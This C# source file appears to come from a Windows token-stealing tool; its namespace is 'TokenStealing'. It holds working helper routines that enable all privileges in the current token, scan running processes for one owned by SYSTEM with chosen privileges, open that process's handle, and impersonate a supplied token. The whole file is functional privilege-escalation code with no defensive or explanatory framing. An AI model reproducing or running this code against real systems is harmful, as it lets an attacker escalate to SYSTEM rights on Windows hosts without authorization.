using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using TokenStealing.Interop;

namespace TokenStealing.Library
{
    using NTSTATUS = Int32;

    internal class Utilities
    {
        public static bool EnableAllTokenPrivileges(out Dictionary<string, bool> adjustedPrivs)
        {
            return EnableAllTokenPrivileges(WindowsIdentity.GetCurrent().Token, out adjustedPrivs);
        }


        public static bool EnableAllTokenPrivileges(
            IntPtr hToken,
            out Dictionary<string, bool> adjustedPrivs)
        {
            bool status;
            adjustedPrivs = new Dictionary<string, bool>();

            do
            {
                status = Helpers.GetTokenPrivileges(
                    hToken,
                    out Dictionary<string, SE_PRIVILEGE_ATTRIBUTES> availablePrivs);

                if (!status)
                    break;

                foreach (var priv in availablePrivs)
                {
                    var tokenPrivileges = new TOKEN_PRIVILEGES(1);
                    var isEnabled = ((priv.Value & SE_PRIVILEGE_ATTRIBUTES.ENABLED) != 0);
                    adjustedPrivs.Add(priv.Key, isEnabled);

                    if (isEnabled)
                        continue;

                    if (NativeMethods.LookupPrivilegeValue(
                        null,
                        priv.Key,
                        out tokenPrivileges.Privileges[0].Luid))
                    {
                        tokenPrivileges.Privileges[0].Attributes = (int)SE_PRIVILEGE_ATTRIBUTES.ENABLED;
                        adjustedPrivs[priv.Key] = NativeMethods.AdjustTokenPrivileges(
                            hToken,
                            false,
                            in tokenPrivileges,
                            20,
                            out TOKEN_PRIVILEGES _,
                            out int _);
                    }
                }
            } while (false);

            return status;
        }


        public static bool EnableTokenPrivileges(
            List<string> requiredPrivs,
            out Dictionary<string, bool> adjustedPrivs)
        {
            return EnableTokenPrivileges(
                WindowsIdentity.GetCurrent().Token,
                requiredPrivs,
                out adjustedPrivs);
        }


        public static bool EnableTokenPrivileges(
            IntPtr hToken,
            List<string> requiredPrivs,
            out Dictionary<string, bool> adjustedPrivs)
        {
            var status = true;
            adjustedPrivs = new Dictionary<string, bool>();

            do
            {
                if (requiredPrivs.Count == 0)
                    break;

                status = Helpers.GetTokenPrivileges(
                    hToken,
                    out Dictionary<string, SE_PRIVILEGE_ATTRIBUTES> availablePrivs);

                if (!status)
                    break;

                foreach (var priv in requiredPrivs)
                {
                    adjustedPrivs.Add(priv, false);

                    foreach (var available in availablePrivs)
                    {
                        if (Helpers.CompareIgnoreCase(available.Key, priv))
                        {
                            if ((available.Value & SE_PRIVILEGE_ATTRIBUTES.ENABLED) != 0)
                            {
                                adjustedPrivs[priv] = true;
                            }
                            else
                            {
                                var tokenPrivileges = new TOKEN_PRIVILEGES(1);

                                if (NativeMethods.LookupPrivilegeValue(
                                    null,
                                    priv,
                                    out tokenPrivileges.Privileges[0].Luid))
                                {
                                    tokenPrivileges.Privileges[0].Attributes = (int)SE_PRIVILEGE_ATTRIBUTES.ENABLED;
                                    adjustedPrivs[priv] = NativeMethods.AdjustTokenPrivileges(
                                        hToken,
                                        false,
                                        in tokenPrivileges,
                                        20,
                                        out TOKEN_PRIVILEGES _,
                                        out int _);
                                }
                            }

                            break;
                        }
                    }

                    if (!adjustedPrivs[priv])
                        status = false;
                }
            } while (false);

            return status;
        }


        public static IntPtr GetSystemProcessHandle(
            List<string> requiredPrivileges,
            ACCESS_MASK processAccessMask,
            ACCESS_MASK tokenAccessMask,
            out int pid,
            out string processName)
        {
            bool status;
            var hProcess = IntPtr.Zero;
            tokenAccessMask |= ACCESS_MASK.TOKEN_QUERY;
            pid = -1;
            processName = null;

            foreach (Process proc in Process.GetProcesses())
            {
                hProcess = NativeMethods.OpenProcess(processAccessMask, false, proc.Id);

                if (hProcess != IntPtr.Zero)
                {
                    status = NativeMethods.OpenProcessToken(hProcess, tokenAccessMask, out IntPtr hToken);

                    if (status)
                    {
                        bool isSystem = Helpers.IsSystem(hToken);
                        Helpers.GetTokenPrivileges(hToken, out Dictionary<string, SE_PRIVILEGE_ATTRIBUTES> privileges);
                        NativeMethods.NtClose(hToken);

                        if (isSystem)
                        {
                            var available = true;

                            foreach (var privilege in requiredPrivileges)
                            {
                                available = false;

                                foreach (var key in privileges.Keys)
                                {
                                    available = Helpers.CompareIgnoreCase(key, privilege);

                                    if (available)
                                        break;
                                }

                                if (!available)
                                    break;
                            }

                            if (available)
                            {
                                pid = proc.Id;
                                processName = proc.ProcessName;
                            }
                        }
                    }

                    if (pid == -1)
                    {
                        NativeMethods.NtClose(hProcess);
                        hProcess = IntPtr.Zero;
                    }
                    else
                    {
                        break;
                    }
                }
            }

            return hProcess;
        }


        public static bool ImpersonateThreadToken(IntPtr hImpersonateToken)
        {
            NTSTATUS ntstatus;
            IntPtr pImpersonationLevel = Marshal.AllocHGlobal(4);
            var status = NativeMethods.ImpersonateLoggedOnUser(hImpersonateToken);

            if (status)
            {
                SECURITY_IMPERSONATION_LEVEL intendedLevel;
                SECURITY_IMPERSONATION_LEVEL currentLevel;
                IntPtr hCurrentToken = WindowsIdentity.GetCurrent().Token;
                status = false;

                do
                {
                    ntstatus = NativeMethods.NtQueryInformationToken(
                        hImpersonateToken,
                        TOKEN_INFORMATION_CLASS.TokenImpersonationLevel,
                        pImpersonationLevel,
                        4u,
                        out uint _);

                    if (ntstatus != Win32Consts.STATUS_SUCCESS)
                        break;
                    else
                        intendedLevel = (SECURITY_IMPERSONATION_LEVEL)Marshal.ReadInt32(pImpersonationLevel);

                    ntstatus = NativeMethods.NtQueryInformationToken(
                        hCurrentToken,
                        TOKEN_INFORMATION_CLASS.TokenImpersonationLevel,
                        pImpersonationLevel,
                        4u,
                        out uint _);

                    if (ntstatus != Win32Consts.STATUS_SUCCESS)
                        break;
                    else
                        currentLevel = (SECURITY_IMPERSONATION_LEVEL)Marshal.ReadInt32(pImpersonationLevel);

                    status = (intendedLevel == currentLevel);
                } while (false);
            }

            return status;
        }
    }
}
